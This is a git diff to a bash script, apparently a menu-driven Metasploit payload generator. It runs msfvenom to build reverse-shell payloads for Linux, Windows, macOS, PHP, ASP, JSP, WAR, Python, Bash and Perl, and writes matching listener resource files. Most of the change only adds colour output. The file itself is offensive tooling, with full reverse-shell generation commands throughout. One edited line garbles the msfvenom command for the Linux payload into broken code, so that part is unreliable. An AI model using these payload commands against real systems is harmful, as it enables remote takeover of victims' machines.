@@ -9,6 +9,7 @@ RESET="\033[00m"       # Normal
 linuxpayload()
 {
 	echo "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" llh
 	echo -e "\n"
@@ -16,7 +17,7 @@ linuxpayload()
 	echo -e "\n"
 	read -p "output" llo
 	echo -e "\n"
-	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$llh LPORT=$llp -f elf > $llo.elf
+	ms echo -e "$GREEN"fvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$llh LPORT=$llp -f elf > $llo.elf
 	##rc creation for linux payload
 	linuxrc
 	start
@@ -25,6 +26,7 @@ linuxpayload()
 windowspayload()
 {
 	echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" wlh
 	echo -e "\n"
@@ -40,6 +42,7 @@ windowspayload()
 macpayload()
 {
 	echo "msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" mlh
 	echo -e "\n"
@@ -53,6 +56,7 @@ macpayload()
 phppayload()
 {
 	echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php && cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" plh
 	echo -e "\n"
@@ -68,6 +72,7 @@ phppayload()
 asppayload()
 {
 	echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" alh
 	echo -e "\n"
@@ -83,6 +88,7 @@ asppayload()
 jsppayload()
 {
 	echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" jlh
 	echo -e "\n"
@@ -97,6 +103,7 @@ jsppayload()
 warpayload()
 {
 	echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" wwlh
 	echo -e "\n"
@@ -111,6 +118,7 @@ warpayload()
 pythonpayload()
 {
 	echo "msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" plh	
 	echo -e "\n"
@@ -125,6 +133,7 @@ pythonpayload()
 bashpayload()
 {
 	echo "msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" ulh
 	echo -e "\n"
@@ -139,6 +148,7 @@ bashpayload()
 perlpayload()
 {
 	echo "msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl"
+	echo -e "$YELLOW"
 	echo -e "\n"
 	read -p "enter lhost:" prh
 	echo -e "\n"
@@ -152,7 +162,7 @@ perlpayload()
 }
 ## resource script starts
 linuxrc()
-{
+{   echo -e "$RED"
 	read -p "enter rc name" lrc
 	echo -e "\n your metsploit rc wil be saved in  $PWD"
 	lsh=$(ls | grep -w "$lrc.rc")
@@ -172,6 +182,7 @@ windowsrc()
 {
 	winsh=$(ls | grep -w "$winrc.rc")
 	if [ "$winsh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" winrc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $winrc.rc
@@ -189,6 +200,7 @@ macrc()
 {
 	macsh=$(ls | grep -w "$macrc.rc")
 	if [ "$macsh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" macrc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $macrc.rc
@@ -206,6 +218,7 @@ phprc()
 {
 	phpsh=$(ls | grep -w "$phprc.rc")
 	if [ "$phpsh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" phprc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $phprc.rc
@@ -223,6 +236,7 @@ asprc()
 {
 	aspsh=$(ls | grep -w "$asprc.rc")
 	if [ "$phpsh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" asprc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $asprc.rc
@@ -240,6 +254,7 @@ jsprc()
 {
 	jspsh=$(ls | grep -w "$jsprc.rc")
 	if [ "$phpsh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" jsprc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $jsprc.rc
@@ -257,6 +272,7 @@ warrc()
 {
 	warsh=$(ls | grep -w "$warrc.rc")
 	if [ "$warsh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" warrc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $warrc.rc
@@ -274,6 +290,7 @@ pyrc()
 {
 	pysh=$(ls | grep -w "$pyrc.rc")
 	if [ "$pysh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" pyrc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $pyrc.rc
@@ -291,6 +308,7 @@ barc()
 {
 	barsh=$(start)
 	if [ "$barsh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" barc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $barc.rc
@@ -308,6 +326,7 @@ perc()
 {
 	persh=$(ls | grep -w "$perc.rc")
 	if [ "$persh" ]; then
+		echo -e "$RED"
 		read -p "enter rc name" perc
 		echo -e "\n your metsploit rc wil be saved in  $PWD"
 		touch $perc.rc
@@ -352,9 +371,9 @@ __   __ / |      / _ \
 EOF
 
 echo -e "$YELLOW"
-echo -e "${RED} @5bhuv4n35h - shankar bhuvanesh"
+echo -e "${BLUE} @5bhuv4n35h - shankar bhuvanesh"
 echo -e "${BLUE} Contribute and collaborate to the easload genrator v1.0 https://github.com/5bhuv4n35h/easy_msfpc_payload_genrator/"
- echo -e "$GREEN"
+echo -e "$GREEN"
 ## main loop starts
 options=("binaries" "webpayloads" "scritpting payloads" "Quit")
 select opt in "${options[@]}"
